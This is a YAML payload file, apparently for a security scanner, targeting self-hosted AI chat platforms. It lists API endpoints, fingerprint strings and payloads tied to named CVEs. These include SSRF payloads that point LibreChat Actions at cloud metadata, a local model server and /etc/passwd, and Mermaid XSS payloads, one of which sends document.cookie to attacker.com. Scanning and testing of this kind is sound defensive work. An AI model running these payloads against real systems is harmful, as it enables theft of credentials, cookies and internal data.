# LibreChat specific endpoints and payloads
librechat_endpoints:
  - "/api/search/test"
  - "/api/assistants"
  - "/api/actions"
  - "/api/files"
  - "/api/convos"
  - "/api/messages"
  - "/api/user"
  - "/api/auth/login"
  - "/api/auth/register"

# LibreChat SSRF via Actions (CVE-2025-69222)
librechat_actions_ssrf:
  - '{"action": {"domain": "http://169.254.169.254", "path": "/latest/meta-data/"}}'
  - '{"action": {"domain": "http://127.0.0.1:11434", "path": "/api/tags"}}'
  - '{"action": {"domain": "file:///etc/passwd", "path": "/"}}'

# LobeChat specific endpoints
lobechat_endpoints:
  - "/api/chat"
  - "/api/plugins"
  - "/api/market"
  - "/api/user"
  - "/trpc"

# LobeChat Mermaid XSS (CVE-2026-23733)
lobechat_mermaid_xss:
  - 'graph TD\n  A["<img src=x onerror=alert(1)>"]'
  - 'graph TD\n  A["<script>alert(document.domain)</script>"]'
  - 'sequenceDiagram\n  participant A as <img/src=x onerror=fetch("http://attacker.com/"+document.cookie)>'

# AnythingLLM endpoints
anythingllm_endpoints:
  - "/api/v1/auth"
  - "/api/v1/workspaces"
  - "/api/v1/documents"
  - "/api/system/env-dump"

# Platform fingerprint identifiers (response body markers)
platform_fingerprints:
  openclaw:
    - "OpenClaw"
    - "openclaw"
    - "gateway"
    - "x-openclaw-version"
  librechat:
    - "LibreChat"
    - "librechat"
    - "meili"
  lobechat:
    - "LobeChat"
    - "lobechat"
    - "trpc"
  anythingllm:
    - "AnythingLLM"
    - "anythingllm"
